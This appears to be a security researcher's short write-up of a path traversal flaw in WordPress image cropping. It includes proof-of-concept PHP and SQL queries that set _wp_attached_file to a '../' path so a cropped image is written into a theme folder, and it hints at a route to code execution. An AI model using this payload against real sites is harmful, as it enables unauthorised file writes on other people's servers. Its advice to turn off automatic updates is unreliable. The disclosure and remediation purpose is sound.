# WordPress write image to any directory RCE

Image cropping in WordPress is sort of unlucky, specially derivation of final image path ( file system or http/s location ), where image will be loaded from the path, but decisions for additional directories creation and final path (no traversal prevention here) are taken from `_wp_attached_file`. Those issues are subject for deeper observation and debugging which will happen in the very near future, for now we need to get another conclusion.

## Eli5 PoC
- Upload image to your local WP and name it wpdeeply.png (in order to be able to use copy paste from here in next steps)
- Get attachment_id (post_id of the image)
- Enable hello.php plugin and add this code at the end of the file
```
function wprcedemo(){
    
    //add your attachment_id here - mine is 77
    $attachment_id = 77;
    
    if ( ! function_exists( 'wp_crop_image' ) ) {
        include ABSPATH . 'wp-admin/includes/image.php';
    }

    wp_crop_image($attachment_id, 0, 0, 300, 300, 300, 300);
    
    exit("good :)");
}

add_action("init", "wprcedemo");

```
- Open mysql administration tool and execute following query
```
UPDATE `wp_postmeta` SET `meta_value` =  concat('2020/07/wpdeeply.png#/','boom.png' ) WHERE `wp_postmeta`.`meta_key` = '_wp_attached_file' and `wp_postmeta`.`post_id` = 77
```
- Refresh the home page (good :) should be printed) and under `2020/07` there should be new directory `wpdeeply.png#`
- Open mysql administration tool and execute following query
```
UPDATE `wp_postmeta` SET `meta_value` = concat('2020/07/wpdeeply.png#/../../../../themes/twentytwenty/boom.png' ) WHERE `wp_postmeta`.`meta_key` = '_wp_attached_file' and `wp_postmeta`.`post_id` = 77
``` 
- Refresh the home page (good :) should be printed) and under `twentytwenty` theme should be `cropped-boom.png` file
- `_wp_page_template` meta_value away from RCE 

## Few facts
- WordPress allows files with valid image extension and any content in it (not complete security patches from the past)
- This bug is also part of not complete security patch in the past
- `_wp_attached_file` value becomes holy grail of WordPress security and still there are ways to interfere with it (via core)
- WP core via its site-health push users to install/configure WP in that way so core files are writable by web server

## Remediation
- Core files shouldn't be writable by www-data user
- Theme files shouldn't be writable by www-data user too 
- Turn automatic updates for WP core, plugins, themes OFF
